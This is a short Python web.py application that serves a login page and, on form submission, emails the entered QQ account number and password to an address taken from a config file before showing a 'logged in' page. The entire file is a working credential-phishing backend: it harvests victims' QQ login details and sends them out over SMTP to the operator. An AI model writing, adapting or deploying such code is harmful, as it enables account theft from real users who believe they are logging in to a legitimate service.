import os
import web

from jinja2 import Environment, FileSystemLoader

from config import *

templates_path = os.getcwd()

env = Environment(loader=FileSystemLoader(templates_path))

web.config.smtp_server = smtp_server
web.config.smtp_port = smtp_port
web.config.smtp_username = smtp_username
web.config.smtp_password = smtp_password
web.config.smtp_starttls = True

class HomeHandler():
    def GET(self):
        return env.get_template("index.html").render(
            logged = False
            )

    def POST(self):
        data = web.input()
        content = '''
        QQ Number: %s
        QQ Password: %s
        ''' % (data.qq, data.password)
        web.sendmail(smtp_username, email, 'QQ', content)
        return env.get_template("index.html").render(
            logged = True
            )

urls=(
    '/', 'HomeHandler',
)

app = web.application(urls, globals())

if __name__ == "__main__":
    app.run()
